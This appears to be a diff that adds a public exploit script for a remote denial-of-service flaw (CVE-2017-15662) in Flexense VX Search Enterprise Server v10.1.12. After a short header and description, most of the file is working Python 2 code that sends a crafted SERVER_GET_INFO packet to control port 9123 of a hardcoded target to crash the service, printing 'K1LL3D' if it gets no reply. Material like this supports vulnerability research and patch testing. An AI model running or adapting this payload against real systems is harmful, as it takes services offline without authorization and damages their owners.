@@ -1,0 +1,46 @@
+# Exploit Title: VX Search Enterprise Server v10.1.12  - Denial of Service
+# Date: 2017-10-20
+# Exploit Author: Ahmad Mahfouz
+# Software Link: http://www.vxsearch.com/setups/vxsearchsrv_setup_v10.1.12.exe
+# Version: v10.1.12
+# Category; Windows Remote DOS
+# CVE: CVE-2017-15662
+# Author Homepage: www.unixawy.com
+
+# Description In Flexense VX Search Enterprise Server v10.1.12, the Control Protocl suffers from a denial of service. The attack vector is a crafted SERVER_GET_INFO packet sent to control port 9123.
+
+ 
+
+import socket
+target = "192.168.72.231"
+port = 9123
+s  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+s.connect((target,port))
+packet = "\x75\x19\xba\xab\x03"
+packet +="\x00\x00\x00\x01\x00\x00\x00\x1a"
+packet += "\x00"
+packet += "\x3e" #evil
+packet += "\x00"
+packet += "\x20"
+packet += "\x00"
+packet += "\x00"
+packet += "\x00"
+packet += "\x00\x00\x00\x00"
+packet += "SERVER_GET_INFO"
+packet += "\x02\x32\x01"
+packet += "Data"
+packet += "\x01\x30\x01\x00"
+packet += "\x04\x02\x74"
+packet += "\x18\x18\x00"
+
+s.send(packet)
+
+try:
+
+         data = s.recv(100)
+         print data
+
+except:
+
+         print "K1LL3D"
